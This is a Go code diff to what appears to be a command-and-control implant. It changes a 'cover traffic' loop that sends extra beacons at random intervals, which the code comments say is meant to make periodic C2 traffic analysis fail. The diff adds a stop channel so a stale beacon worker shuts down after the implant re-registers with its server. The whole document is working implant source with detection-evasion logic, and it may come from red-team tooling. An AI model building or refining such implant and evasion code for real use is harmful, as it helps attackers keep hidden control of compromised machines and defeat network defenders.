@@ -143,14 +143,22 @@ var activeTransport transport
 
 // coverTrafficLoop fires extra beacons at random sub-intervals so inter-beacon
 // timing has a wide, irregular distribution — making periodic C2 analysis fail.
-func coverTrafficLoop(t transport, state *beaconState) {
+func coverTrafficLoop(t transport, state *beaconState, stop <-chan struct{}) {
 	for {
 		state.mu.Lock()
 		base := time.Duration(state.sleepSec) * time.Second
 		state.mu.Unlock()
 		// Random fraction of current interval: 10%–90%
 		frac := rand.Float64()*0.80 + 0.10
-		time.Sleep(time.Duration(float64(base) * frac))
+		timer := time.NewTimer(time.Duration(float64(base) * frac))
+		select {
+		case <-stop:
+			if !timer.Stop() {
+				select { case <-timer.C: default: }
+			}
+			return
+		case <-timer.C:
+		}
 		if tasks, err := t.beacon(); err == nil {
 			for _, task := range tasks {
 				go dispatchTask(t, task)
@@ -164,11 +172,18 @@ func Run(t transport) {
 	sleepSec, jitterPct := parseSleepConfig()
 	state := &beaconState{sleepSec: sleepSec, jitterPct: jitterPct}
 	updateSleep = state.set
+	var coverStop chan struct{}
 
 	info := getSysInfo()
 
 outer:
 	for {
+		// A stale cover-traffic worker must not survive a re-registration and
+		// continue beaconing with the old agent/session state.
+		if coverStop != nil {
+			close(coverStop)
+			coverStop = nil
+		}
 		// ── registration loop ──────────────────────────────────────────────
 		for {
 			if err := t.register(info); err != nil {
@@ -187,7 +202,8 @@ outer:
 				CACertPEM    = ""
 			}
 			if CoverTraffic == "true" {
-				go coverTrafficLoop(t, state)
+				coverStop = make(chan struct{})
+				go coverTrafficLoop(t, state, coverStop)
 			}
 			break
 		}
